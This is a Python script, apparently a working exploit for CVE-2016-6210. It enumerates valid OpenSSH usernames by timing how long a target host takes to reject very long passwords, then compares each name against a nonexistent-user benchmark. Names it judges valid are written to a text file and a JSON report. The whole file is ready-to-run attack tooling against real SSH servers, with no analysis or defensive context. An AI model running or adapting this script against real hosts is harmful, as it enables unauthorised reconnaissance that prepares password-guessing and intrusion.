import paramiko
import time, sys, csv, os
import threading
import logging
import json

if len(sys.argv) < 4:
    print("REL: CVE-2016-6210")
    print("Usage: " + sys.argv[0] + " uname_list.txt host outfile")
    sys.exit()

p = 'A' * 25000
THREAD_COUNT = 3  # This is also the amount of "samples" that the application will take into account for each calculation (time/THREAD_COUNT) = avg_resp;
FAKE_USER = "AaAaAaAaAa"  # Benchmark user, I definitely don't exist
BENCHMARK = 0

num_lines = sum(1 for line in open(sys.argv[1]))
username_list = sys.argv[1]
var = 0
time_per_user = 0
threads = []
usertimelist = {}


def save_results(data, filepath='report/exploit.json'):
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    if os.path.exists(filepath):
        with open(filepath, 'r') as file:
            existing_data = json.load(file)
    else:
        existing_data = []

    existing_data.append(data)

    with open(filepath, 'w') as file:
        json.dump(existing_data, file, indent=4)


def ssh_connection(target, usertarget, outfile):
    global time_per_user
    starttime = 0
    endtime = 0
    total = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    starttime = time.perf_counter()
    try:
        ssh.connect(target, username=usertarget, password=p)
    except:
        endtime = time.perf_counter()  # TIME the connection
    total = endtime - starttime
    # print usertarget+" : "+str(total) # print times of each connection attempt as its going (username:time)
    with open(outfile, 'a+') as outputFile:
        csvFile = csv.writer(outputFile, delimiter=',')
        data = [[usertarget, total]]
        csvFile.writerows(data)
    time_per_user += total


if not os.stat(username_list).st_size == 0:
    print("- Connection logging set to paramiko.log, necessary so Paramiko doesn't fuss, useful for debugging.")
    paramiko.util.log_to_file("paramiko.log")
    ssh_bench = paramiko.SSHClient()
    ssh_bench.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("- Calculating a benchmark using FAKE_USER for more accurate results...")
    tempbench = []
    for i in range(0, 5):
        starttime = time.perf_counter()
        try:
            ssh_bench.connect(sys.argv[2], username=FAKE_USER, password=p)
        except:
            endtime = time.perf_counter()
        tempbench.append(endtime - starttime)
    BENCHMARK = sum(i for i in tempbench) / 5
    print("* Benchmark Successfully Calculated: " + str(BENCHMARK))
    with open(username_list) as users:
        for username in users:
            username = username.strip()
            for i in range(THREAD_COUNT):
                threader = threading.Thread(target=ssh_connection, args=(sys.argv[2], username, sys.argv[3]))
                threads.append(threader)
            for thread in threads:
                thread.start()
                thread.join()
            threads = []
            print("[+] Averaged time for username " + username + " : " + str((time_per_user / THREAD_COUNT)))
            usertimelist.update({username: (time_per_user / THREAD_COUNT)})
            time_per_user = 0
else:
    print("[-] List is empty.. what did you expect? Give me some usernames.")
    # [thread.start() for thread in threads]  # Why doesn't true multithreading work?
    # [thread.join() for thread in threads]  # Tell me why?.. Why?

result_data = []
for user in sorted(usertimelist.items(), key=lambda item: item[1], reverse=True):
    benchmark_ratio = user[1] / BENCHMARK
    fname = sys.argv[2].replace('.', '_') + "_valid_usernames.txt"
    if benchmark_ratio <= 0.10:  # 10% or less
        print("[+] " + user[0] + " invalid user; less than 10 percent of benchmark at: " + str(benchmark_ratio))
    elif benchmark_ratio < 0.20:
        print("[+] " + user[0] + " toss up, not including based on current settings at: " + str(benchmark_ratio))
    elif 0.20 <= benchmark_ratio < 0.30:  # 20% greater
        print("[+] " + user[0] + " likely a valid user at: " + str(benchmark_ratio) + ". Appending to: " + fname)
        with open(fname, "a+") as outputFile:
            outputFile.write(user[0] + "\n")
        result_data.append({
            "username": user[0],
            "benchmark_ratio": benchmark_ratio,
            "status": "likely valid"
        })
    elif benchmark_ratio >= 0.30:  # 30% or greater above the benchmark
        print("[+] " + user[0] + " is a valid user, appending to: " + fname)
        with open(fname, "a+") as outputFile:
            outputFile.write(user[0] + "\n")
        result_data.append({
            "username": user[0],
            "benchmark_ratio": benchmark_ratio,
            "status": "valid"
        })

if result_data:
    save_results(result_data)